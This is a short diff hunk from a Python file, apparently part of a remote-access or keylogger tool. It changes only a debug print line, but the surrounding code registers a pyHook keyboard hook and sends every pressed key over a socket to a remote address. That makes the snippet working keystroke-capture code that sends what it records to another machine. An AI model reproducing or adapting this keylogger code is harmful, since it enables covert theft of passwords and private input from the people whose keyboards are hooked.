@@ -42,7 +42,7 @@ def send_command(sock, addr):
     hookmanager = pyHook.HookManager()
     def onKeyDown(event):
         sock.send((event.Key).encode("UTF-8"))
-        #print(str(event.Key) + ' is pressed')
+        print(str(event.Key) + ' is pressed')
         return True
     hookmanager.KeyDown = onKeyDown
     hookmanager.HookKeyboard()
